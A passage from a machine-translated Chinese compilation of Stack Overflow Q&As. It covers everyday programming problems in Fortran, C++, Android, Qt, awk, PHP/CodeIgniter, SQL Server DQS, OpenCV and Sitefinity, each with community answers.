else if (StartDate.Date <= CurrentDate.Date && EndDate.Date > CurrentDate.Date) { return Hours % DayHours; }
else return 0; 
```

变量可能会发生变化，具体取决于您的实际代码，但这会使用您所说的数据。

# fortran - 打开文件或创建文件和附加数据的单个命令

> ID：15526203
> 
> 赞同：25
> 
> 时间：2013-03-20T14:21:43.680
> 
> 标签：fortran, fortran90

我想知道在 Fortran 中是否可以只使用一个命令（带有选项/说明符）来执行以下操作：

1.  如果文件存在，则打开文件并附加一些数据（这可以通过以下方式完成：`open(unit=40,file='data.data',Access = 'append',Status='old')`但如果文件不存在，则会发出运行时错误）

2.  如果文件不存在，则创建文件并写入一些数据。

我目前正在使用`inquire`检查文件是否存在，但我仍然必须使用该`open`语句来追加或写入数据。

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-03-20T17:33:05.023

据我所知，唯一*安全*的解决方案是按照您已经在做的方式，`open`针对不同的情况使用不同的语句：

```
program proba
  implicit none

  logical :: exist

  inquire(file="test.txt", exist=exist)
  if (exist) then
    open(12, file="test.txt", status="old", position="append", action="write")
  else
    open(12, file="test.txt", status="new", action="write")
  end if
  write(12, *) "SOME TEXT"
  close(12)
end program proba 
```

您可能对我的[Fortran interface library to libc file system calls (modFileSys) 感兴趣](https://bitbucket.org/aradi/modfilesys)，它至少可以`inquire`通过直接查询文件状态为您节省逻辑变量和语句：

```
if (file_exists("test.txt")) then
    ...
else
    ...
end if 
```

但当然你可以自己轻松地编写一个类似的函数，特别是它不会把你从这两个`open`语句中拯救出来......

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2016-11-29T14:55:09.083

```
open(61,file='data.txt',action='write',position='append')
write(61,*) 'hey'
close(61) 
```

这将附加到现有文件，否则创建和写入。添加`status='unknown'`将是等效的。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-03-20T14:58:01.583

如果您将状态从“旧”替换为“未知”，那么如果文件存在或现在，您将不会收到运行时错误。

谢谢

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-11-01T01:43:28.997

`access`在 open 语句中添加如下属性；

```
Open(unit=031,file='filename.dat',form='formatted',status='unknown',access='append') 
```

上述语句将打开文件而不破坏旧数据，写入命令将在文件中追加新行。fortran 90 最简单的解决方案。

# c++ - C++11 基于范围的 for 和 map：可读性

> ID：15526204
> 
> 赞同：11
> 
> 时间：2013-03-20T14:21:54.770
> 
> 标签：c++, c++11, dictionary, foreach, code-readability

新的基于范围的 for 循环确实提高了可读性并且非常易于使用。但是，请考虑以下事项：

```
map<Foo,Bar> FooAndAssociatedBars;

for (auto& FooAndAssociatedBar : FooAndAssociatedBars) {
    FooAndAssociatedBar.first.doSth();
    FooAndAssociatedBar.second.doSomeOtherThing();
} 
```

这可能是一个细节，但我发现如果我可以做类似的事情会更具可读性：

```
for ( (auto& foo, auto& bar) : FooAndAssociatedBars) {
    foo.doSth();
    bar.doSomeOtherThing();
} 
```

你知道等效的语法吗？

**编辑：** 好消息：C++17 有一个解决这个问题的提案，称为结构化绑定（参见[1](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2016/p0144r2.pdf)）。在 C++17 中，您应该能够编写：

```
tuple<T1,T2,T3> f(/*...*/) {
    /*...*/ 
    return {a,b,c};
}
auto [x,y,z] = f(); // x has type T1, y has type T2, z has type T3 
```

解决了这个可读性问题

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-20T14:25:02.063

没有你想要的东西。最接近的是在循环内声明变量：

```
for (auto& FooAndAssociatedBar : FooAndAssociatedBars) {
    auto& foo = FooAndAssociatedBar.first;
    auto& bar = FooAndAssociatedBar.second;

    // ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T15:33:02.017

不是一个好主意。迟早，您会希望 a 相同`std::tuple`，并且编译器应该能够自动在 a`std::get<>`上使用`tuple`。在我看来，您的方法目前只是让您满意，并且您会发现这种方法存在问题（假设它是以这种方式实现的）。

标准委员会经过深思熟虑，设计了基于范围的 for 循环。它比`foreach`其他语言的循环要好得多，而且要短得多。加上它`auto&`，你就完成了！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T15:33:01.377

当然，您始终可以使用 lambda。

```
std::map<int, const char*> m { { 4, "hello" }, { 11, "c++" } };
convenient_for_each(m, [](int a, const char* b) {
    std::cout << b << a << std::endl;
  });
convenient_for_each(m, [](std::pair<int, const char> p) {
    std::cout << p.first << p.second << std::endl;
  }); 
```

或包装为宏（不推荐）

```
FOREACH((int a, const char* b), m, std::cout << a << b << std::endl);
FOREACH((std::pair<int, const char*> p), m, std::cout << p.first << p.second << std::endl); 
```

（[LWS 的 Hackish 示例实现](http://liveworkspace.org/code/3EhROV%240)）

不过，自动不起作用，我仍在等待多态 lambda。我的方法理论上也能够处理元组。

# sql-server - NHibernate在添加约束时生成不引用列的DB脚本

> ID：15526207
> 
> 赞同：1
> 
> 时间：2013-03-20T14:22:01.050
> 
> 标签：sql-server, nhibernate, ddl

我有一个具有以下属性的 nhibernate xml 类（称为 class1）：

```
<many-to-one name="Rank" class="RankColourScheme" column="Rank_" 
property-ref="Rank" not-null="true" fetch="join"/> 
```

Rank_ 列不是主键列。

当我使用 nhibernate 生成 sql 脚本来创建表时，SQL 行是：

```
alter table dbo.Class1_  add constraint FK_Rank foreign key (Rank_) 
references dbo.RankColourScheme_ 
```

此行失败，因为约束未引用该列。

实际的sql应该是：

```
alter table dbo.Class1_  add constraint FK_Rank foreign key (Rank_) 
references dbo.RankColourScheme_ (Rank_) 
```

知道我的 xml 做错了什么吗？

提前致谢，

纳迪亚

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T02:41:19.210

看看：[NHibernate - 映射字符串外键](https://stackoverflow.com/questions/462281/nhibernate-mapping-a-string-foreign-key)

您需要将其定义为：

```
<bag name=”Inventory” table=”INVENTORY” lazy=”true”&gt;
 <key column=”ID” property-ref=”OID” />
 <one-to-many class=”GuitarStore.Common.Inventory” />
 </bag> 
```

这最初也是在 nhibernate [https://nhibernate.jira.com/browse/NH-1272](https://nhibernate.jira.com/browse/NH-1272)中，并且在 2.1.0Alpha1 中已修复。

# android - 发送 JSON Post Android 时遇到问题

> ID：15526217
> 
> 赞同：1
> 
> 时间：2013-03-20T14:22:40.733
> 
> 标签：android, json, post

自从我为 Android 编程以来已经有一段时间了，我丢失了所有以前的工作，其中包含我遇到问题的代码。我正在为 Android 和 iPhone 开发一个应用程序，它连接到同一台服务器以下载数据。在 iPhone 版本中一切都很好，但在 Android 上，当我使用包含我想在服务器上运行的方法名称的发布数据访问服务器时，似乎数据没有添加到请求中。

为什么 POST 不适用于 Android 的此请求，但适用于 iPhone 版本的应用程序？

这是我正在使用的代码：

```
public static void makeRequest() throws Exception {
    Thread t = new Thread() {
        public void run() {
            Looper.prepare(); //For Preparing Message Pool for the child Thread
            HttpClient client = new DefaultHttpClient();
            HttpConnectionParams.setConnectionTimeout(client.getParams(), 10000);
            HttpResponse response;
            HttpEntity entity;
            JSONObject json = new JSONObject();

            try {
                HttpPost post = new HttpPost("http://divisi.co.uk/rest/requesthandler.php");
                json.put("method", "getEventListData");

                StringEntity se = new StringEntity(json.toString());  
                se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE, "application/json"));
                post.setEntity(se);

                response = client.execute(post);

                entity = response.getEntity();

                String retSrc = EntityUtils.toString(entity); 

                JSONObject result = new JSONObject(retSrc); //Convert String to JSON Object
                if(result.getString("SC") == "200"){
                    JSONArray data = result.getJSONArray("data");
                }
                else{

                }

            } catch(Exception e) {
                e.printStackTrace();
            }

            Looper.loop(); //Loop in the message queue
        }
    };
    t.start();
} 
```

我从服务器得到的响应是：

```
{"data":{"scalar":""},"SC":405,"timestamp":1363788265} 
```

意味着找不到方法名称，即未在我对服务器的请求中发布。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T15:22:25.027

这是我如何做这样的事情的一个例子：

```
HttpClient httpClient = new DefaultHttpClient();

HttpPost postRequest = new HttpPost("http://divisi.co.uk/rest/requesthandler.php");
MultipartEntity reqEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
reqEntity.addPart(new FormBodyPart("method", new StringBody("getEventListData")));
reqEntity.addPart(new FormBodyPart("NEED_A_KEY_HERE", new StringBody("" + json.toString())));

postRequest.setEntity(reqEntity);
HttpResponse response = httpClient.execute(postRequest);
JSONObject responseDict = new JSONObject(EntityUtils.toString(response.getEntity())); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T11:55:59.800

允许这是您的“ [http://divisi.co.uk/rest/requesthandler.php](http://divisi.co.uk/rest/requesthandler.php) ”页面代码，然后在android中您可以使用它...您不允许在您的URL中发布，

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-11T07:36:32.020

在您的服务器端使用提琴手。查看http消息是否正确。看来您的服务器端有问题，您能否向我们展示您接收和解析 json 的服务器端代码。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-11T15:10:45.347

如果服务器无法读取您的请求，请尝试删除：

```
se.setContentType(new BasicHeader(HTTP.CONTENT_TYPE, "application/json")); 
```

它将使用默认的 MIME 类型 HTTP.PLAIN_TEXT_TYPE 即“text/plain”。

如果您的代码是您发布的代码而不是更复杂的输入 JSON 对象，我看不到任何其他可能性。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-11T18:33:51.213

您设置 POST 正文的代码可能没问题。我认为问题可能出在您的网络服务上。尝试使用 Rested 或 curl 之类的工具手动调用您的服务器。我提出了与您提出的完全相同的请求，包括有无 POST 正文，并且我从您的服务器得到了相同的响应：

```
{"data":{"scalar":""},"SC":405,"timestamp":1365704082} 
```

一些可能会绊倒你的事情：

```
JSONObject result = new JSONObject(retSrc); //Convert String to JSON Object
if(result.getString("SC") == "200"){
    JSONArray data = result.getJSONArray("data");
} 
```

在这里，您正在使用 比较字符串“405”和“200” `==`，此时您应该先进行空检查，然后再使用`.equals("200")`。或者，使用`result.getInt("SC") == 200`因为这是响应 JSON 中的整数类型。

此外，来自服务器响应的“数据”实体实际上并没有作为 JSON 数组返回。你应该`getJSONObject("data")`改用。

此外，将字符串外部化总是一个好主意。

以下是代码的外观：

```
public static final String JSON_KEY_SC = "SC";
public static final String JSON_KEY_DATA = "data";

...

JSONObject result = new JSONObject(retSrc); //Convert String to JSON Object

String sc = result.getString(JSON_KEY_SC);
if (sc != null && sc.equals("200")) {
    JSONObject data = result.getJSONObject(JSON_KEY_DATA);
}
else {
    ...
} 
```

# qt - 在 qwebview 中加载 html 页面时未调用 javaScriptWindowObjectCleared 信号

> ID：15526219
> 
> 赞同：0
> 
> 时间：2013-03-20T14:22:48.093
> 
> 标签：qt, qt4, qt5

我是 QT 的新手。我一直试图看到 javascript 和 Qt 类之间的桥梁。

我做了什么：

1）我有一个按钮并将点击信号连接到on_pushButton_clicked，我也有qwebview实例。

在 on_pushButton_clicked 中：

...

```
QUrl url = QUrl::fromLocalFile("C:\\whoami\\sd\\index.html");

  QObject::connect(ui->webView->page()->mainFrame(), SIGNAL(javaScriptWindowObjectCleared()),
                     this, SLOT(addJSObject()));

  ui->webView->page()->mainFrame()->load(QUrl(url));
.... 
```

在 addJSObject 中，

```
void MainWindow::addJSObject()
{
    qDebug () <<"Inside addJSObject";
    ui->webView->page()->mainFrame()->addToJavaScriptWindowObject(QString("mBridge"), m_bridge);
    qDebug () <<"Nooo. I m not invoked..";
} 
```

问题：

它编译没有错误，并且 html 文件显示在 qwebview 中，但没有调用 addJSObject 回调。

有人可以帮我解决这个问题吗？..我一定犯了一些愚蠢的错误。:(。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T06:30:54.927

确保您的 MainWindow：1) 继承 QObject 2) 具有 Q_OBJECT 宏 3) 具有插槽 addJSObject()。

例如 mainwindow.h：

```
class MainWindow : public QObject
{
  Q_OBJECT
public:
  MainWindow();

private slots:
  void addJSObject();

}; 
```

如果这是正确的，您应该能够在没有静态 QObject::connect() 的情况下连接到 addJSObject()。将其称为信号目标对象时只需使用 connect() 即可。

一种检查信号是否有效的方法是尝试使用 QTimer 超时信号：

```
QTimer::singleShot(5000, this, SLOT(addJSObject())); 
```

# awk - AWK - 找到任意大小的每一行的最小值

> ID：15526220
> 
> 赞同：1
> 
> 时间：2013-03-20T14:22:55.510
> 
> 标签：awk, min

我有一个文件，其中的行如下：

```
5 3 6 4 2 3 5
1 4 3 2 6 5 8
.. 
```

我想获得每行的最小值，例如，使用上面给出的输入，我应该得到：

```
min of first line:  2
min of second line: 1
.. 
```

如何使用 awk 对每行中任意数量的列执行此操作？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-20T14:53:19.590

如果您不介意使用数字而不是单词的输出，您可以使用这一行：

```
$ awk '{m=$1;for(i=1;i<=NF;i++)if($i<m)m=$i;print "min of line",NR": ",m}' file
min of line 1:  2
min of line 2:  1 
```

如果你真的想计算序数：

```
BEGIN {
    split("first second third fourth",count," ")
}
{
    min=$1
    for(i=1;i<=NF;i++)
    if($i<min)
        min=$i

    print "min of",count[NR],"line: \t",min
} 
```

将其保存`script.awk`并运行如下：

```
$ awk -f script.awk file
min of first line:    2
min of second line:   1 
```

显然，这仅适用于最多 4 行的文件，但只需将序数列表增加到您认为需要的最大数量。您应该可以很容易地在网上找到一份清单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:25:09.857

你的问题很简单。您需要做的就是`min`在脚本的`BEGIN`一部分中定义一个变量，并且在每一行，您只需对最小元素执行一个简单的类似 C 的算法（将第一个字段设置为`min`，然后使用下一个字段，依此类推，直到到达该行的最后一个字段）。由于变量 NF，您将知道该行中的字段总数。因此，只需编写一个 for 循环即可。一旦为该行完全执行了 for 循环，您将拥有最小的元素，您可以打印它。

# php - 使用动态值 codeigniter 填充动态复选框

> ID：15526221
> 
> 赞同：0
> 
> 时间：2013-03-20T14:22:58.220
> 
> 标签：php, codeigniter, dynamic, checkbox

我有一个带有添加和编辑功能的表单。在表单内部，它们有复选框。复选框本身是从 mysql 表生成的。

当我想做添加功能时，复选框已正确填充。但是，当我输入表单的编辑功能时出现问题。

我需要在提交时检查复选框值。

这是我的代码：

**控制器：**

```
public function edit($id)
{
    $data['query'] = $this->Campaign_model->edit($id);
    $data['branch_list'] = $this->Campaign_model->get_branch_list();
    $data['branch_checked'] = $this->Campaign_model->get_checked_branches($id);

    $this->load->view('campaign_form', $data);
} 
```

`$data['branch_list']`包含主要复选框。包含在`$data['branch_checked']`当前数据（查询）中选中哪些复选框。

**看法：**

```
$branch_id = "";

foreach($branch_list as $branch_list_checkbox)
{
    if($branch_list_checkbox->id == $branch_checked->branch_id)
    {
        $branch_id .= '<label><input name="branch_id[]" type="checkbox" value="'.$branch_list_checkbox->id.'" checked />'.$branch_list_checkbox->name.'</label>&nbsp;';
    }
    else
    {
        $branch_id .= '<label><input name="branch_id[]" type="checkbox" value="'.$branch_list_checkbox->id.'" />'.$branch_list_checkbox->name.'</label>&nbsp;';
    }           
} 
```

中的所有内容`$branch_list`都已正确填充。但是我如何`$branch_checked`正确地分配给他们各自的复选框呢？

需要帮助，谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:27:22.330

看起来你做对了。也许您需要放置的不仅仅是“检查”

```
$branch_id .= '<label><input name="branch_id[]" type="checkbox" value="'.$branch_list_checkbox->id.'" checked="checked" />'.$branch_list_checkbox->name.'</label>&nbsp;'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T14:57:26.760

其实只有`checked`很好。当我运行上面的代码时，它会产生错误：

```
A PHP Error was encountered

Severity: Notice

Message: Trying to get property of non-object

Filename: views/campaign_form.php

Line Number: 104 
```

第 104 行是：

```
if($branch_list_checkbox->id == $branch_checked->branch_id) 
```

并且有2个错误框。

`$branch_list`和产生的输出`$branch_checked`是数组，所以我想我应该做一个`foreach`to`$branch_checked`但我不知道如何写它。

我用谷歌搜索发现`foreach($a as $b => $c)`，但我不明白它是如何工作的；但是我试图将任何可能使用的变量放在代码上，它会产生错误。

# java - ArrayAdapter 要求资源 ID 为 TextView

> ID：15526222
> 
> 赞同：0
> 
> 时间：2013-03-20T14:22:59.683
> 
> 标签：java, android

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" >

    <ImageView
        android:id="@+id/icon"
        android:layout_width="22px"
        android:layout_height="22px"
        android:layout_marginLeft="4px"
        android:layout_marginRight="10px"
        android:layout_marginTop="4px"
        android:src="@drawable/ic_launcher" >
    </ImageView>

    <TextView
        android:id="@+id/label"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@+id/label"
        android:textSize="20px" >
    </TextView>

</LinearLayout> 
```

以上是我的布局“ `messages.xml`”

```
public class TabClass extends ListFragment {    

    @Override
      public void onActivityCreated(Bundle savedInstanceState) {
        super.onActivityCreated(savedInstanceState);
        String[] values = new String[] { "label1", "label2", "label3"};
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(getActivity(),
            R.layout.messages, values);
        setListAdapter(adapter);
      }

      @Override
      public void onListItemClick(ListView l, View v, int position, long id) {
        // Do something with the data

      }

} 
```

当我尝试编译应用程序时出现此错误`"ArrayAdapter requires the resource ID to be a TextView"`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:27:35.560

您的messages.xml 包含一个带有ImageView 和TextView 的LinearLayout。相反，它应该只包含一个 TextView。[请参阅此处](http://developer.android.com/reference/android/widget/ArrayAdapter.html#ArrayAdapter%28android.content.Context,%20int,%20T%5B%5D%29)的文档。您的 ArrayAdapter 构造函数的第二个参数采用：

> 包含在实例化视图时使用的 TextView 的布局文件的资源 ID。

提示：您可能想要创建自定义适配器类（扩展 BaseAdapter）而不是 ArrayAdapter 类。

# php - 如何让 PHP 表单页面在成功提交时关闭？

> ID：15526226
> 
> 赞同：0
> 
> 时间：2013-03-20T14:23:07.020
> 
> 标签：php, forms

有没有一种快速简便的方法可以让这个 form.php 代码在提交后关闭窗口而不是重定向？如果无法做到这一点，我可以处理重定向，但希望关闭窗口，因为原始表单正在新窗口中打开。下面的代码：

```
<?php
if (!empty($_POST)) {

// Used for later to determine result
$success = $error = false;

// Object syntax looks better and is easier to use than arrays to me
$post = new stdClass;

// Usually there would be much more validation and filtering, but this
// will work for now.
foreach ($_POST as $key => $val)
    $post->$key = trim(strip_tags($_POST[$key]));

// Check for blank fields
if (empty($post->First) OR empty($post->Last) OR empty($post->Email))
    $error = true;

else {

    // Get this directory, to include other files from
    $dir = dirname(__FILE__);

    // Get the contents of the HTML email into a variable for later
    ob_start();
    require_once($dir.'/html.php');
    $html_message = ob_get_contents();
    ob_end_clean();

    // Load the SwiftMailer files
    require_once($dir.'/swift/swift_required.php');

    $mailer = new Swift_Mailer(new Swift_MailTransport()); // Create new instance     of SwiftMailer

    $message = Swift_Message::newInstance()
                   ->setSubject('Hospitality Recycling Program Calculator Results') // Message subject
                  ->setTo(array('bsmith@cleantheworld.org', $post->Email =>$post-> First ))  // Array of people to send 

                   ->setFrom(array('bsmith@cleantheworld.org' => 'Clean the World')) // From:
                   ->setBody($html_message, 'text/html');

    // Send the email, and show user message
    if ($mailer->send($message))
        $success = true;
    else
        $error = true;

}

}
header("location: http://www.cleantheworld.org/newpartner.asp"); 
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T14:32:10.453

我同意@jeroen 的观点，更好的解决方案是使用 AJAX，但您可以在重定向的头部输出一些 javascript 来关闭页面。同样，我不建议将此作为解决问题的好方法，但只要在用户浏览器中启用了 javascript，它就会起作用。

```
<script type="text/javascript>
    self.close();
</script> 
```

# sql-server-2012 - DQS - 匹配空域

> ID：15526229
> 
> 赞同：1
> 
> 时间：2013-03-20T14:23:10.193
> 
> 标签：sql-server-2012, matching, data-quality-services

是否可以在 DQS**数据质量项目**中配置匹配规则以忽略匹配空域？如果两个空域值被认为是 100% 匹配，我觉得很奇怪。当然，我总是可以`newid()`在底层 sql 数据源（视图）内的所有空域中写入，但这有点矫枉过正，也许有“正确”的方法可以做到这一点......

![匹配分数详情](../Images/7be03eb3e58909cbec5b9220c5b566cd.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-03-31T00:20:11.583

遗憾的是，目前不支持此功能，因此仅存在您上面列出的解决方法。

“两条记录对应字段中的空值将被视为匹配”

来源：

[http://technet.microsoft.com/en-us/library/hh213071.aspx](http://technet.microsoft.com/en-us/library/hh213071.aspx)

[http://social.msdn.microsoft.com/Forums/sqlserver/en-US/7b52419c-0bb8-4e56-b920-e68ff551bd76/can-i-set-a-matching-rule-to-only-match-if- the-value-is-not-null?forum=sqldataqualityservices](http://social.msdn.microsoft.com/Forums/sqlserver/en-US/7b52419c-0bb8-4e56-b920-e68ff551bd76/can-i-set-a-matching-rule-to-only-match-if-the-value-is-not-null?forum=sqldataqualityservices)

实施任何解决方法时的注意事项 - 性能将受到负面影响。您会在使用更大的数据集时更加注意到这一点。

FWIW 我实施的解决方法：

*   将匹配结果保存到表中，包括一列 isMatchingScoreAdjusted 默认 0
*   查找具有空匹配的所有记录并计算调整后的值
*   更新结果

示例过程

```
DECLARE @GIVEN_NAME FLOAT = 22;

WITH adjustedscore
AS (
    SELECT c.MatchingScore
        + case when  p.GIVEN_NAME is null and c.GIVEN_NAME is null then -@GIVEN_NAME else 0 end 
        as [AdjustedMatchingScore]
        ,c.RecordId
FROM [dbo].[dqs_matches] p
INNER JOIN [dbo].[dqs_matches] c ON c.SiblingId = p.RecordId
WHERE c.IsPivot = 0
    AND p.GIVEN_NAME IS NULL
    AND c.GIVEN_NAME IS NULL
)
UPDATE m SET MatchingScore = a.AdjustedMatchingScore, isMatchingScoreAdjusted = 1
FROM adjustedscore a
INNER JOIN [dbo].[dqs_matches] m ON m.RecordId = a.RecordId
where m.isMatchingScoreAdjusted = 0 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T19:48:13.363

我找到了可以接受的解决方案。*复合域内*的空字段不被视为匹配。

顺便说一句，如果两条记录的*所有*复合域字段都是空白的，那么这些域被认为是 100% 匹配的。但我对此很满意。

# android - 项目没有 project.properties 文件。更改android项目路径

> ID：15526231
> 
> 赞同：1
> 
> 时间：2013-03-20T14:23:22.467
> 
> 标签：android, eclipse

我更改了我的 android 应用程序所在的文件夹并重新导入了它。然后我得到了错误：

```
Project has no project.properties file! Edit the project properties to set one. Wakeify - Spotify Alarm - Plus      Unknown Android Target Problem 
```

`Android Tools - Fix Project Properties`不能解决这个问题。当我进入项目属性时，路径和位置被列为旧路径！我更改了路径，所以我不明白为什么它在属性中引用旧路径。我在重新导入之前删除了旧项目。

除了新路径之外，我如何让 eclipse 在它的新路径中完全识别我的项目？我别无选择，只能使用新路径，因为 ndk-build 想要一个没有空格的路径。

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T16:38:25.600

右键项目->重构->重命名->改名为文件夹名。

不知道为什么 eclipse 需要我这样做，但这就是解决方案。

# opencv - 训练opencv

> ID：15526232
> 
> 赞同：1
> 
> 时间：2013-03-20T14:23:23.117
> 
> 标签：opencv

我正在尝试使用 haar 训练来训练级联。我使用了以下参数。

```
C:\opencv\opencv_bin\bin>opencv_haartraining -data haar -vec train.vec  -bg neg.
txt -numPos 1000 -numNeg 2000 -nstages 10 -mem 2000 -mode all -w 30 -h 32 
```

但我收到以下错误

```
Data dir name: haar
Vec file name: train.vec
BG  file name: neg.txt, is a vecfile: no
Num pos: 2000
Num neg: 2000
Num stages: 10
Num splits: 1 (stump as weak classifier)
Mem: 2000 MB
Symmetric: TRUE
Min hit rate: 0.995000
Max false alarm rate: 0.500000
Weight trimming: 0.950000
Equal weights: FALSE
Mode: BASIC
Width: 30
Height: 32
Applied boosting algorithm: GAB
Error (valid only for Discrete and Real AdaBoost): misclass
Max number of splits in tree cascade: 0
Min number of positive samples per cluster: 500
Required leaf false alarm rate: 0.000976563

Tree Classifier
Stage
+---+
|  0|
+---+

Number of features used : 234720

Parent node: NULL

*** 1 cluster ***
OpenCV Error: Unspecified error (Vec file sample size mismatch) in icvGetHaarTra
iningDataFromVec, file C:\Downloads\Software\OpenCV-2.2.0-win\OpenCV-2.2.0\modul
es\haartraining\cvhaartraining.cpp, line 1929
terminate called after throwing an instance of 'cv::Exception'
  what():  C:\Downloads\Software\OpenCV-2.2.0-win\OpenCV-2.2.0\modules\haartrain
ing\cvhaartraining.cpp:1929: error: (-2) Vec file sample size mismatch in functi
on icvGetHaarTrainingDataFromVec

This application has requested the Runtime to terminate it in an unusual way.
Please contact the application's support team for more information.

C:\opencv\opencv_bin\bin>cmd |as.txt
'as.txt' is not recognized as an internal or external command,
operable program or batch file. 
```

我正在使用一个 vec 文件，它有 1000 个从互联网下载的样本，并且有 2000 个负样本。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-10T05:46:04.743

“Vec 文件样本大小不匹配” - 尝试检查站点的样本大小。vec 文件可能不是 30x32 图像的文件（您尝试将其作为 -w 30 -h 32 传递）。

这只是一个猜测。试试看。并尝试使用 traincascade 对象。它在 $OpencvDir$/apps/traincascade/ 中。像任何其他对象一样编译它。它也可用于 LBP 和 HOG。

希望这可以帮助。

问候， Prasanna S

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-03-15T06:29:54.907

The ratio of w and h is different from the setting in info.txt. You should modify w's and h's of all images in info.txt int 30:32.

# sitefinity - “作者”角色的新用户无法查看新闻项目列表

> ID：15526236
> 
> 赞同：0
> 
> 时间：2013-03-20T14:23:28.437
> 
> 标签：sitefinity, sitefinity-3x

在我的 Sitefinity 3.7 网站中，我创建了一个新用户，它是“作者”角色的成员。当用户尝试查看新闻项目列表 (../Sitefinity/Admin/Modules.aspx?module=News) 时，会抛出以下异常：

==================================================== ==========================“/”应用程序中的服务器错误。

* * *

在“~/ControlTemplates/News/NewsItemsList.ascx”的模板中找不到所需的控件。该控件必须是可分配的表单类型“System.Web.UI.WebControls.IButtonControl”，并且必须具有 ID“groupOperationsLink”。说明：执行当前 Web 请求期间发生未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。

异常详细信息：Telerik.Cms.Web.UI.TemplateException：在“~/ControlTemplates/News/NewsItemsList.ascx”的模板中找不到所需的控件。该控件必须是可分配的表单类型“System.Web.UI.WebControls.IButtonControl”，并且必须具有 ID“groupOperationsLink”。

源错误：在执行当前 Web 请求期间生成了未处理的异常。可以使用下面的异常堆栈跟踪来识别有关异常起源和位置的信息。

* * *

版本信息：Microsoft .NET Framework 版本：2.0.50727.3082；ASP.NET 版本：2.0.50727.3082

==================================================== ==========================

你能推荐一个修复吗？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T15:24:34.583

管理员需要确保作者角色对新闻模块具有权限。确保为作者角色、查看、创建等设置了适当的权限。

导航到新闻模块后，权限就在左栏中。一旦设置了这些权限，您就可以开始使用了！

# c# - 无法从开关循环中的枚举中分配值

> ID：15526238
> 
> 赞同：0
> 
> 时间：2013-03-20T14:23:29.587
> 
> 标签：c#, asp.net-mvc, enums

在我的模型中，我有一个如下所示的枚举：

```
public enum m_ItemType
{
    Unknown = 0,
    //
    Physical = 1,
    //
    Logical = 2,
} 
```

我有这个方法，它基于另一个具有此枚举值的项目列表构建项目列表：

```
private static List<ItemType> BuildListItem(IEnumerable<ItemToSend> listItemToSend)
{
     List<ItemType> listItemsToReturn = new List<ItemType>();

     foreach (var item in listItemToSend)
     {
          ItemType itemToAdd = new ItemType();

          itemToAdd.Title = item.m_Title;
          itemToAdd.Description = item.m_Description;

          switch (item.m_ItemType)
          {
              case 0:
                 itemToAdd.Type = AnotherEnumValue.Unknown;
                 break;
              case 1:
                 itemToAdd.Type = AnotherEnumValue.Physical;
                 break;
              case 2:
                 itemToAdd.Type = AnotherEnumValue.Logical;
                 break;
          }    

          listItemsToReturn.Add(itemToAdd);
     }

     return listItemsToReturn;
} 
```

但是代码没有编译并一直告诉我枚举名称此时无效。谁能解释我为什么？我不明白。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T14:29:20.883

如果数据类型`item.m_ItemType`是`m_ItemType`，首先我会将其重命名为更明智的名称（`ItemType`应该可以）。然后，您需要在 switch 的 case 语句中使用该名称。试试这个：

```
// your enum
public enum ItemType
{
    Unknown = 0,
    //
    Physical = 1,
    //
    Logical = 2,
}

// your model
public class ItemToSend
{
    public ItemType m_ItemType { get; set; }
}

// in your action
private static List<ItemType> BuildListItem(IEnumerable<ItemToSend> listItemToSend)
{
    ...
    switch (item.m_ItemType)
    {
        case ItemType.Unknown:
            itemToAdd.Type = AnotherEnumValue.Unknown;
            break;
        case ItemType.Physical:
            itemToAdd.Type = AnotherEnumValue.Physical;
            break;
        case ItemType.Logical:
            itemToAdd.Type = AnotherEnumValue.Logical;
            break;
    } 
    ...
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-20T14:27:03.750

在您的第一个示例中，枚举被命名`m_ItemType`，但应该是`AnotherEnumValue`。

因此，在该行`switch (item.m_ItemType)`中，点后面的值被解释为类型名称，而不是字段。

# pharo - PetitParser 不是分布式的？

> ID：15526239
> 
> 赞同：2
> 
> 时间：2013-03-20T14:23:34.667
> 
> 标签：pharo, petitparser

PetitParser 中的规则是可分配的吗？

有以下规则：

```
integerLiteral --> hexIntegerLiteral / octalIntegerLiteral / decimalIntegerLiteral
  hexIntegerLiteral     --> hexNumeral , (integerTypeSuffix optional)
  octalIntegerLiteral   --> octalNumeral , (integerTypeSuffix optional)
